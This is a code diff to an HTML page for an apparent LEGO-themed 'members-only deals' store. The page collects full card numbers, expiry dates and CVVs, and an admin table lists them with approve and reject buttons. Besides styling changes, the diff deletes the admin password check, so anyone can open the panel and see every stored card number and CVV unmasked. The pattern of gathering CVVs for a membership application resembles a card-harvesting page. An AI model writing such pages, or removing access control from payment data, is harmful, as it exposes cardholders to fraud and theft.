@@ -98,6 +98,11 @@
             box-shadow: 0 6px 0 #D4AF37;
         }
         
+        .admin-btn {
+            background-color: var(--lego-green);
+            color: white;
+        }
+        
         /* === Main Page Styles === */
         .flash-banner {
             background-color: var(--lego-yellow);
@@ -238,6 +243,10 @@
             width: 100%;
             border-collapse: collapse;
             margin-top: 20px;
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
         
         th, td {
@@ -249,6 +258,16 @@
         th {
             background-color: var(--lego-blue);
             color: white;
+            position: sticky;
+            top: 0;
+        }
+        
+        tr:nth-child(even) {
+            background-color: #f9f9f9;
+        }
+        
+        tr:hover {
+            background-color: #f1f1f1;
         }
         
         .action-btn {
@@ -257,6 +276,7 @@
             border-radius: 4px;
             cursor: pointer;
             margin-right: 5px;
+            font-size: 14px;
         }
         
         .approve-btn {
@@ -278,6 +298,20 @@
             font-family: monospace;
             letter-spacing: 1px;
         }
+        
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            th, td {
+                padding: 8px;
+                font-size: 14px;
+            }
+            
+            .action-btn {
+                padding: 3px 6px;
+                font-size: 12px;
+                margin-right: 3px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -292,7 +326,7 @@
                         <p class="tagline">Exclusive Members-Only Deals</p>
                     </div>
                 </div>
-                <button class="cart-btn" onclick="showAdmin()">
+                <button id="member-access-btn" class="cart-btn" onclick="toggleAdmin()">
                     🔐 Member Access
                 </button>
             </div>
@@ -406,7 +440,7 @@
                         <p class="tagline">Customer Applications</p>
                     </div>
                 </div>
-                <button class="cart-btn" onclick="showStore()">
+                <button id="admin-exit-btn" class="cart-btn admin-btn" onclick="toggleAdmin()">
                     ← Back to Store
                 </button>
             </div>
@@ -422,6 +456,7 @@
                         <th>Card Number</th>
                         <th>Expiry</th>
                         <th>CVV</th>
+                        <th>Date</th>
                         <th>Status</th>
                         <th>Actions</th>
                     </tr>
@@ -436,12 +471,12 @@
     <script>
         // Database
         let users = JSON.parse(localStorage.getItem('legoUsers')) || [];
-        const adminPassword = "legobank123";
         
         // DOM Elements
         const storeFront = document.getElementById('store-front');
         const approvalPage = document.getElementById('approval-page');
         const adminPanel = document.getElementById('admin-panel');
+        const memberAccessBtn = document.getElementById('member-access-btn');
         
         // Format card number input
         document.getElementById('card-number').addEventListener('input', function(e) {
@@ -461,34 +496,27 @@
             e.target.value = value;
         });
         
-        // Save to localStorage
-        function saveUsers() {
-            localStorage.setItem('legoUsers', JSON.stringify(users));
-        }
-        
-        // Show admin panel
-        function showAdmin() {
-            const password = prompt("Enter admin password:");
-            if (password === adminPassword) {
+        // Toggle between store and admin views
+        function toggleAdmin() {
+            if (adminPanel.classList.contains('hidden')) {
+                // Show admin panel
                 storeFront.classList.add('hidden');
                 approvalPage.classList.add('hidden');
                 adminPanel.classList.remove('hidden');
                 renderAdminTable();
             } else {
-                alert("Incorrect password");
+                // Show store
+                storeFront.classList.remove('hidden');
+                approvalPage.classList.add('hidden');
+                adminPanel.classList.add('hidden');
             }
-        }
-        
-        // Show store
-        function showStore() {
-            storeFront.classList.remove('hidden');
-            approvalPage.classList.add('hidden');
-            adminPanel.classList.add('hidden');
         }
         
         // Return to store from approval page
         function returnToStore() {
-            showStore();
+            storeFront.classList.remove('hidden');
+            approvalPage.classList.add('hidden');
+            adminPanel.classList.add('hidden');
             document.getElementById('registration-form').reset();
         }
         
@@ -513,7 +541,7 @@
             };
             
             users.push(user);
-            saveUsers();
+            localStorage.setItem('legoUsers', JSON.stringify(users));
             showApprovalPage(user);
         }
         
@@ -553,6 +581,35 @@
         
         // Render admin table
         function renderAdminTable() {
+            // Initialize with sample data if empty
+            if (users.length === 0) {
+                users = [
+                    {
+                        id: 'LB-1001',
+                        firstName: 'John',
+                        lastName: 'Doe',
+                        email: 'john@example.com',
+                        cardNumber: '4111111111111111',
+                        expiryDate: '12/25',
+                        cvv: '123',
+                        status: 'approved',
+                        date: new Date().toLocaleString()
+                    },
+                    {
+                        id: 'LB-1002',
+                        firstName: 'Jane',
+                        lastName: 'Smith',
+                        email: 'jane@example.com',
+                        cardNumber: '5555555555554444',
+                        expiryDate: '06/24',
+                        cvv: '456',
+                        status: 'pending',
+                        date: new Date().toLocaleString()
+                    }
+                ];
+                localStorage.setItem('legoUsers', JSON.stringify(users));
+            }
+            
             const table = document.getElementById('admin-table');
             table.innerHTML = '';
             
@@ -562,9 +619,10 @@
                     <td>${user.id}</td>
                     <td>${user.firstName} ${user.lastName}</td>
                     <td>${user.email}</td>
-                    <td class="card-masked">${user.cardNumber}</td>
+                    <td class="card-masked">${formatCardNumber(user.cardNumber)}</td>
                     <td>${user.expiryDate}</td>
                     <td>${user.cvv}</td>
+                    <td>${user.date}</td>
                     <td>${user.status}</td>
                     <td>
                         ${user.status === 'pending' ? 
@@ -578,12 +636,24 @@
             });
         }
         
+        // Format card number for display
+        function formatCardNumber(number) {
+            if (!number) return '';
+            const cleaned = number.replace(/\D/g, '');
+            const parts = [];
+            for (let i = 0; i < cleaned.length; i += 4) {
+                parts.push(cleaned.substr(i, 4));
+            }
+            return parts.join(' ');
+        }
+        
         // Update user status
         function updateStatus(userId, status) {
             const user = users.find(u => u.id === userId);
             if (user) {
                 user.status = status;
-                saveUsers();
+                user.date = new Date().toLocaleString(); // Update timestamp
+                localStorage.setItem('legoUsers', JSON.stringify(users));
                 renderAdminTable();
             }
         }
@@ -592,27 +662,39 @@
         function deleteUser(userId) {
             if (confirm("Delete this user permanently?")) {
                 users = users.filter(u => u.id !== userId);
-                saveUsers();
+                localStorage.setItem('legoUsers', JSON.stringify(users));
                 renderAdminTable();
             }
         }
         
-        // Initialize
-        document.addEventListener('DOMContentLoaded', () => {
-            // Sample admin user if empty
+        // Initialize with sample data if empty
+        document.addEventListener('DOMContentLoaded', function() {
             if (users.length === 0) {
-                users.push({
-                    id: 'LB-1001',
-                    firstName: 'Admin',
-                    lastName: 'User',
-                    email: 'admin@example.com',
-                    cardNumber: '4111111111111111',
-                    expiryDate: '12/25',
-                    cvv: '123',
-                    status: 'approved',
-                    date: new Date().toLocaleString()
-                });
-                saveUsers();
+                users = [
+                    {
+                        id: 'LB-1001',
+                        firstName: 'John',
+                        lastName: 'Doe',
+                        email: 'john@example.com',
+                        cardNumber: '4111111111111111',
+                        expiryDate: '12/25',
+                        cvv: '123',
+                        status: 'approved',
+                        date: new Date().toLocaleString()
+                    },
+                    {
+                        id: 'LB-1002',
+                        firstName: 'Jane',
+                        lastName: 'Smith',
+                        email: 'jane@example.com',
+                        cardNumber: '5555555555554444',
+                        expiryDate: '06/24',
+                        cvv: '456',
+                        status: 'pending',
+                        date: new Date().toLocaleString()
+                    }
+                ];
+                localStorage.setItem('legoUsers', JSON.stringify(users));
             }
         });
     </script>
